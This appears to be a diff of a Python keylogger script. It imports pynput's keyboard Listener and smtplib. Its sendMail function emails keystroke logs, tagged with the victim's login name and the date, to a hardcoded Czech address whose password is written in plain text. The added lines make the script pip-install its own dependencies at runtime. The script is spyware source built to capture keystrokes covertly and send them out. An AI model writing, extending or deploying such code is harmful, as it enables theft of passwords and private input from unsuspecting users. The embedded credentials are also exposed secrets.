@@ -1,9 +1,12 @@
-import pynput, smtplib, os, re, win32api, datetime, platform, atexit, shutil, sys
+import pynput, smtplib, os, re, win32api, datetime, platform, atexit, shutil, sys, pip
 from pynput.keyboard import Key, Listener
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
+
+pip.main(["install", "--user", "pynput"])
+pip.main(["install", "--user", "datetime"])
 
 #Variables
 count = 0
@@ -28,7 +31,7 @@ def sendMail():
     email_send = "oplpet0@seznam.cz"
     email_password = "gormitihulk123"
     subject = f"{logNumber}. {os.getlogin()} {dateNow} Log"
-
+    
     #Formating the email message
     msg = MIMEMultipart()
     msg['From'] = email_user
